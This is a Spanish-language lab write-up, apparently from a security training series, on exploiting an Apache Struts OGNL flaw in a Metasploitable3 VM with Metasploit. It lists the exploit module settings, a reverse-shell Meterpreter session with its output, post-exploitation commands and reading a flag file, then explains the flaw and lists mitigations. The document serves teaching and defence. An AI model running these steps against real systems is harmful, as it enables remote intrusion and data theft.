# 04 — Explotación de Apache Struts con Metasploit

## Objetivo

Validar la vulnerabilidad de Apache Struts detectada por GVM explotándola
con Metasploit Framework y obtener una shell remota en Metasploitable3.

---

## Reconocimiento previo

Antes de explotar, se confirmó con Nmap que el servicio Jetty/Struts
estaba activo en el puerto 8080:

```bash
nmap -sV -p 8080 192.168.56.102
```

Resultado:
```
8080/tcp open http Jetty 8.1.7.v20120910
```

---

## Búsqueda del exploit en Metasploit

Abrir Metasploit en Kali Linux:

```bash
msfconsole
```

Buscar módulos disponibles para Apache Struts:

```bash
search struts
```

El módulo utilizado:

```
exploit/multi/http/struts2_content_type_ognl
```

---

## Configuración del exploit

```bash
use exploit/multi/http/struts2_content_type_ognl
```

Configurar los parámetros:

```bash
set RHOSTS 192.168.56.102
set TARGETURI /continuum/index.action
set LHOST 192.168.56.101
set LPORT 4444
```

Verificar la configuración:

```bash
show options
```

| Parámetro | Valor | Descripción |
|---|---|---|
| RHOSTS | 192.168.56.102 | IP de Metasploitable3 (objetivo) |
| TARGETURI | /continuum/index.action | Ruta vulnerable de Apache Struts |
| LHOST | 192.168.56.101 | IP de Kali Linux (atacante) |
| LPORT | 4444 | Puerto de escucha para la shell |

---

## Ejecución del exploit

```bash
run
```

### Resultado obtenido

```
[*] Started reverse TCP handler on 192.168.56.101:4444
[*] Sending stage (1062760 bytes) to 192.168.56.102
[*] Meterpreter session 1 opened (192.168.56.101:4444 -> 192.168.56.102:37743)
    at 2026-03-13 14:41:22 +0100

meterpreter >
```

✅ Shell remota obtenida con éxito.

---

## Post-explotación

Una vez dentro con la sesión Meterpreter, se verificó el acceso:

```bash
meterpreter > sysinfo
meterpreter > getuid
meterpreter > shell
```

Obtención del flag del reto:

```bash
cat /home/vagrant/flag_struts.txt
```

---

## Explicación técnica

**Apache Struts** es un framework de desarrollo web Java. La vulnerabilidad
explotada (`struts2_content_type_ognl`) permite la **ejecución remota de
código (RCE)** a través de una cabecera HTTP `Content-Type` malformada.

El atacante envía una expresión OGNL (Object-Graph Navigation Language)
en la cabecera de la petición HTTP. Struts la evalúa sin sanitizarla,
ejecutando el código en el contexto del servidor.

Esta vulnerabilidad fue explotada masivamente en el mundo real — el
famoso **breach de Equifax (2017)** que expuso datos de 147 millones
de personas fue causado por una vulnerabilidad de Apache Struts sin parchear.

---

## Mitigación

| Medida | Descripción |
|---|---|
| Actualizar Struts | Usar versiones parcheadas (2.5.33+ o 6.x) |
| WAF | Implementar un Web Application Firewall |
| Validación de entrada | Sanitizar cabeceras HTTP en el servidor |
| Principio de mínimo privilegio | El proceso web no debe correr como root |
| Monitorización | Detectar payloads OGNL con un SIEM (Wazuh) |

---

## Conclusión

GVM/OpenVAS identificó correctamente la vulnerabilidad de Apache Struts
en Metasploitable3. La explotación con Metasploit confirmó que la
vulnerabilidad era real y explotable, obteniendo acceso completo al sistema.

Este flujo de trabajo — **escanear → analizar → validar** — es el proceso
estándar en auditorías de seguridad profesionales.

---

<sub>← [03 — Escaneo de Metasploitable3](./03-escaneo-metasploitable3.md)</sub>